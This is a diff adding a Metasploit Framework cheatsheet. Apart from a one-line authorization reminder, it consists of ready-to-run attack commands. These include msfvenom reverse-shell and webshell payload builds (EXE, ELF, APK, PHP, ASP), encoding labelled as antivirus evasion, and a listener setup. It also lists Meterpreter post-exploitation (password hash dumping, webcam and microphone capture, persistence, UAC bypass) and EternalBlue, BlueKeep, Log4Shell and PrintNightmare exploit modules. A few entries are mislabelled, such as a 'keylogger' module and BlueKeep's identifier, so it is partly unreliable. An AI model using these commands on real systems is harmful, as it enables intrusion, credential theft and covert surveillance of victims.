@@ -1,0 +1,171 @@
+METASPLOIT FRAMEWORK CHEATSHEET
+
+OVERVIEW
+Metasploit is the world's most widely used penetration testing framework.
+Contains exploits, payloads, auxiliary modules, encoders, and post-exploitation tools.
+Always use on authorized systems only.
+
+STARTING METASPLOIT
+Start database: sudo systemctl start postgresql
+Initialize DB (first time): sudo msfdb init
+Launch console: msfconsole
+Launch quietly: msfconsole -q
+
+BASIC NAVIGATION
+List all modules: show all
+Search for module: search [keyword]
+Search by type: search type:exploit platform:windows smb
+Use a module: use [module path]
+Show module info: info
+Show options: show options
+Show advanced options: show advanced
+Show payloads: show payloads
+Show targets: show targets
+Go back: back
+Help: help
+
+SEARCH EXAMPLES
+search eternalblue
+search ms17-010
+search type:exploit name:smb
+search cve:2021-44228 (Log4Shell)
+search platform:linux type:exploit local
+
+MODULE TYPES
+exploit/ = exploits that deliver a payload
+auxiliary/ = scanners, fuzzers, brute forcers, no payload
+payload/ = code executed on target after exploit
+post/ = post-exploitation modules
+encoder/ = obfuscate payloads
+nop/ = no-operation sleds
+
+SETTING OPTIONS
+Set option: set [OPTION] [value]
+Set globally: setg [OPTION] [value]
+Unset: unset [OPTION]
+Show current settings: show options
+Required fields: RHOSTS (target), LHOST (your IP), LPORT (your port)
+
+RHOSTS can be:
+Single IP: set RHOSTS 192.168.1.10
+Range: set RHOSTS 192.168.1.1-254
+CIDR: set RHOSTS 192.168.1.0/24
+From file: set RHOSTS file:/path/to/hosts.txt
+
+RUNNING MODULES
+Check if target is vulnerable: check
+Run the module: run or exploit
+Run in background: run -j
+List background jobs: jobs
+Kill job: jobs -k [id]
+Interact with session: sessions -i [id]
+
+PAYLOADS
+List compatible payloads: show payloads
+Set payload: set PAYLOAD [payload path]
+
+Payload types:
+singles = self-contained, no stager needed
+stagers = small, sets up connection channel
+stages = downloaded by stager, full featured
+
+Common payloads:
+windows/x64/meterpreter/reverse_tcp = Windows 64-bit meterpreter (staged)
+windows/x64/shell/reverse_tcp = Windows 64-bit shell (staged)
+linux/x86/meterpreter/reverse_tcp = Linux meterpreter
+python/meterpreter/reverse_tcp = Python meterpreter
+php/meterpreter/reverse_tcp = PHP meterpreter
+java/meterpreter/reverse_tcp = Java meterpreter
+
+METERPRETER COMMANDS
+System info: sysinfo
+Current user: getuid
+Get system privileges: getsystem
+List processes: ps
+Migrate to process: migrate [PID]
+Get shell: shell
+Drop to background: background or Ctrl+Z
+Take screenshot: screenshot
+Webcam snap: webcam_snap
+Record mic: record_mic -d 10
+Dump password hashes: hashdump
+Run post module: run post/[module]
+Upload file: upload /local/file /remote/path
+Download file: download /remote/file /local/path
+List files: ls
+Change directory: cd
+Search for files: search -f *.txt
+Port forward: portfwd add -l 3389 -p 3389 -r 192.168.1.10
+Pivot: route add 192.168.2.0/24 [session_id]
+
+POST EXPLOITATION MODULES
+Dump hashes: use post/windows/gather/hashdump
+Credential collector: use post/multi/gather/credentials
+Enum logged users: use post/windows/gather/enum_logged_on_users
+Enum applications: use post/windows/gather/enum_applications
+Keylogger start: use post/multi/manage/shell_to_meterpreter
+Persistence: use post/windows/manage/persistence
+Bypass UAC: use post/windows/escalate/bypassuac
+
+SESSIONS
+List all sessions: sessions or sessions -l
+Interact with session: sessions -i [id]
+Kill session: sessions -k [id]
+Kill all sessions: sessions -K
+Upgrade shell to meterpreter: sessions -u [id]
+
+AUXILIARY MODULES
+Port scanner: use auxiliary/scanner/portscan/tcp
+SMB version: use auxiliary/scanner/smb/smb_version
+FTP brute: use auxiliary/scanner/ftp/ftp_login
+SSH brute: use auxiliary/scanner/ssh/ssh_login
+HTTP brute: use auxiliary/scanner/http/http_login
+SMB shares: use auxiliary/scanner/smb/smb_enumshares
+SNMP enum: use auxiliary/scanner/snmp/snmp_enum
+MS17-010 scan: use auxiliary/scanner/smb/smb_ms17_010
+
+MSFVENOM (generate standalone payloads)
+Windows reverse shell EXE:
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe
+
+Linux reverse shell ELF:
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf
+
+PHP webshell:
+msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php
+
+ASP webshell:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f asp -o shell.asp
+
+Android APK:
+msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o shell.apk
+
+Encode payload (basic AV evasion):
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o shell.exe
+
+List formats: msfvenom --list formats
+List encoders: msfvenom --list encoders
+List payloads: msfvenom --list payloads
+
+SETTING UP LISTENER
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+run -j
+
+FAMOUS EXPLOITS
+EternalBlue MS17-010 (Windows SMB):
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS target
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+run
+
+BlueKeep MS19-0708 (RDP):
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+
+Log4Shell:
+use exploit/multi/http/log4shell_header_injection
+
+PrintNightmare:
+use exploit/windows/dcerpc/cve_2021_1675_printspooler
